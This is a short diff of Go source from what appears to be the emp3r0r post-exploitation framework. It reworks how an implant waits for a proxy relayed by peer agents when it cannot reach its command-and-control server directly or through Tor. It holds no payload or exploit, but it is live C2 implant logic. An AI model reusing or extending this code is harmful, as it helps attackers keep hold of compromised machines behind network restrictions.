@@ -211,33 +211,30 @@ test_agent:
 			return true
 
 		} else if !tun.IsTor(emp3r0r_data.CCAddress) && !tun.IsProxyOK(agent.RuntimeConfig.C2TransportProxy) {
-			*cnt++
 			// we don't, just wait for some other agents to help us
 			log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
 			if *cnt == 0 {
-				ctx, cancel := context.WithCancel(context.Background())
 				go func() {
+					ctx, cancel := context.WithCancel(context.Background())
 					log.Printf("[%d] Starting broadcast server to receive proxy", *cnt)
 					err := agent.BroadcastServer(ctx, cancel, "")
 					if err != nil {
 						log.Fatalf("BroadcastServer: %v", err)
 					}
 				}()
-				for ctx.Err() == nil {
-					if agent.RuntimeConfig.C2TransportProxy != "" {
-						log.Printf("[+] Thank you! We got a proxy: %s", agent.RuntimeConfig.C2TransportProxy)
-						return true
-					}
-				}
 			}
+			*cnt++
 			return false
 		}
-
 		return true
 	}
 	i := 0
 	for !checkInternet(&i) {
 		log.Printf("[%d] Checking Internet connectivity...", i)
+		if agent.RuntimeConfig.C2TransportProxy != "" {
+			log.Printf("[+] Thank you! We got a proxy: %s", agent.RuntimeConfig.C2TransportProxy)
+			break
+		}
 		time.Sleep(time.Duration(util.RandInt(3, 20)) * time.Second)
 	}
 
